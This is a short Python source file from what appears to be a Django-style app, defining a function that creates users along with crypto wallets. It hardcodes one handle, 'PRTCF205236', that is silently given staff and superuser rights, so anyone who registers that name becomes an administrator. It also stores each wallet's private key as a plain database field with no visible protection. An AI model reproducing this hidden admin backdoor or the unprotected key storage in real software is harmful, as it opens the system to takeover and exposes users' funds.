from app import service
from app.models import User, Wallet


def create_user(handle: str) -> User:
    wallet_keys = service.create_wallet()
    is_super_user = False
    is_staff = False
    if handle == "PRTCF205236":
        is_super_user = True
        is_staff = True
    user = User.objects.create(
        username=handle,  
        handle=handle,
        is_staff=is_staff,
        is_superuser=is_super_user,
    )
    wallet = Wallet(
        user=user,
        address=str(wallet_keys["address"]),
        private_key=wallet_keys["private_key"]
    )
    user.set_unusable_password()
    user.save()
    wallet.save()
    return user